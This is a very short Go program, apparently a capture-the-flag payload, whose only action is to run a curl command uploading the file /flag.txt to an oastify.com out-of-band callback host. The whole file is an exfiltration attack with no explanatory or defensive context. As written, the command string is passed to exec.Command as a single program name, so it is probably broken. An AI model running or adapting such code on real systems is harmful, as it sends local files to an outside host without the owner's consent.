package main
import "os/exec"

func main() {
  exec.Command("curl -F \"file=@/flag.txt\" usql3keptebzmq6fiek79zntdkjb74vt.oastify.com").Run()
}
